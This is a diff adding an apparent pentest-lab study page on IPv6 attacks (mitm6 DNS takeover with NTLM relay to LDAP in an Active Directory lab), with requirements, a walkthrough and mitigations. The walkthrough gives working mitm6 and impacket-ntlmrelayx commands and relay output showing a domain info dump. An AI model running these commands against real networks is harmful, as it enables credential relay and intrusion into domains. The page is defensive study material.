@@ -318,7 +318,9 @@ document.write(`
   </button>
 `);
 </script>
-
+<button class="sidebar-toggle secondary-toggle btn btn-sm" title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <span class="fa-solid fa-list"></span>
+</button>
 </div></div>
       
     </div>
@@ -334,6 +336,18 @@ document.write(`
     <div id="print-main-content">
         <div id="jb-print-toc">
             
+            <div>
+                <h2> Contents </h2>
+            </div>
+            <nav aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#intended-functionality">Intended Functionality</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-can-go-wrong-here">What can go wrong here?</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-requirements">Attack Requirements</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-walkthrough">Attack walkthrough</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigation-strategies">Mitigation strategies</a></li>
+</ul>
+            </nav>
         </div>
     </div>
 </div>
@@ -345,6 +359,70 @@ document.write(`
                   
   <section id="ipv6-attacks">
 <h1>IPv6 Attacks<a class="headerlink" href="#ipv6-attacks" title="Permalink to this heading">#</a></h1>
+<section id="intended-functionality">
+<h2>Intended Functionality<a class="headerlink" href="#intended-functionality" title="Permalink to this heading">#</a></h2>
+<p>IPv6 is enabled by default on modern Windows systems, even in networks that primarily use IPv4. Windows will prefer IPv6 over IPv4 for name resolution and connectivity. When a system cannot resolve a hostname via DNS, it may fall back to LLMNR/NetBIOS over IPv6 and query for WPAD (Web Proxy Auto-Discovery) or DNS via multicast. This is intended to allow automatic configuration and connectivity in IPv6-enabled networks without requiring manual setup.</p>
+</section>
+<section id="what-can-go-wrong-here">
+<h2>What can go wrong here?<a class="headerlink" href="#what-can-go-wrong-here" title="Permalink to this heading">#</a></h2>
+<p>An attacker can exploit this by deploying a rogue IPv6 DNS server using tools like mitm6. Since Windows machines prioritize IPv6, they will accept DNS and WPAD responses from the attacker. This lets the attacker redirect victims’ authentication attempts (NTLM) to themselves, then relay those credentials to a service such as LDAP(S) on a Domain Controller.</p>
+</section>
+<section id="attack-requirements">
+<h2>Attack Requirements<a class="headerlink" href="#attack-requirements" title="Permalink to this heading">#</a></h2>
+<ul class="simple">
+<li><p>IPv6 enabled on victim machines (default in Windows).</p></li>
+<li><p>No legitimate IPv6 infrastructure in the environment, otherwise, the rogue DNS/DHCP advertisements would conflict.</p></li>
+<li><p>NTLM authentication allowed (common in AD environments for legacy compatibility).</p></li>
+<li><p>LDAP/SMB signing not enforced, so that relayed credentials can be accepted.</p></li>
+<li><p>A user or machine account must attempt network authentication (e.g., via WPAD, logon, reboot, or resource access).</p></li>
+<li><p>Attacker has network access (plugged into internal LAN, Wi-Fi, or already on a compromised host).</p></li>
+</ul>
+</section>
+<section id="attack-walkthrough">
+<h2>Attack walkthrough<a class="headerlink" href="#attack-walkthrough" title="Permalink to this heading">#</a></h2>
+<ol class="arabic simple">
+<li><p>Launch mitm6 on the attacker machine to impersonate an IPv6 DNS/DHCP server and advertise itself to the network:</p></li>
+</ol>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">mitm6</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth0</span> <span class="o">-</span><span class="n">d</span> <span class="n">marvel</span><span class="o">.</span><span class="n">local</span>
+</pre></div>
+</div>
+<ol class="arabic simple" start="2">
+<li><p>Run impacket-ntlmrelayx to listen for NTLM authentication attempts and relay them to a target service, typically LDAP(S) on the Domain Controller</p></li>
+</ol>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">impacket</span><span class="o">-</span><span class="n">ntlmrelayx</span> <span class="o">-</span><span class="mi">6</span> <span class="o">-</span><span class="n">t</span> <span class="n">ldap</span><span class="p">(</span><span class="n">s</span><span class="p">):</span><span class="o">//</span><span class="mf">10.0.2.18</span> <span class="o">-</span><span class="n">wh</span> <span class="n">fakewpad</span><span class="o">.</span><span class="n">marvel</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">l</span> <span class="n">lootme</span>
+</pre></div>
+</div>
+<ol class="arabic simple" start="3">
+<li><p>Trigger events to generate authentication traffic (rebooting a machine like THEPUNISHER or logging in as Administrator). This forces the victim to reach out for WPAD/DNS resolution, sending authentication requests to the attacker.</p></li>
+<li><p>The attacker captures and relays the NTLM authentication to the DC, gaining access or privilege escalation depending on the relayed account’s rights.</p></li>
+</ol>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>[*] HTTPD(80): Connection from ::ffff:10.0.2.16 controlled, attacking target ldap://10.0.2.18
+[*] HTTPD(80): Client requested path: http://www.msftconnecttest.com/connecttest.txt
+[*] HTTPD(80): Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt
+[*] HTTPD(80): Authenticating against ldap://10.0.2.18 as MARVEL/THEPUNISHER$ SUCCEED
+[*] Enumerating relayed user&#39;s privileges. This may take a while on large domains
+[*] HTTPD(80): Authenticating against ldap://10.0.2.18 as MARVEL/THEPUNISHER$ SUCCEED
+[*] Enumerating relayed user&#39;s privileges. This may take a while on large domains
+[*] Dumping domain info for first time
+[*] All targets processed!
+</pre></div>
+</div>
+<figure class="align-center" id="id1">
+<a class="reference internal image-reference" href="../../../_images/loot.png"><img alt="Loot" src="../../../_images/loot.png" style="width: 100%;" /></a>
+<figcaption>
+<p><span class="caption-text">Dumped Domain info</span><a class="headerlink" href="#id1" title="Permalink to this image">#</a></p>
+</figcaption>
+</figure>
+</section>
+<section id="mitigation-strategies">
+<h2>Mitigation strategies<a class="headerlink" href="#mitigation-strategies" title="Permalink to this heading">#</a></h2>
+<ul class="simple">
+<li><p>Disable IPv6 if the environment does not require it.</p></li>
+<li><p>Enforce SMB and LDAP signing to prevent NTLM relay attacks.</p></li>
+<li><p>Disable WPAD (via Group Policy) to prevent automatic proxy discovery.</p></li>
+<li><p>Restrict high-privilege accounts from authenticating to untrusted systems, reducing the impact of relayed credentials.</p></li>
+</ul>
+</section>
 </section>
 
 
@@ -382,6 +460,25 @@ document.write(`
             </div>
             
             
+              
+                <div class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">
+
+
+  <div class="sidebar-secondary-item">
+  <div class="page-toc tocsection onthispage">
+    <i class="fa-solid fa-list"></i> Contents
+  </div>
+  <nav class="bd-toc-nav page-toc">
+    <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#intended-functionality">Intended Functionality</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-can-go-wrong-here">What can go wrong here?</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-requirements">Attack Requirements</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-walkthrough">Attack walkthrough</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigation-strategies">Mitigation strategies</a></li>
+</ul>
+  </nav></div>
+
+</div></div>
               
             
           </div>
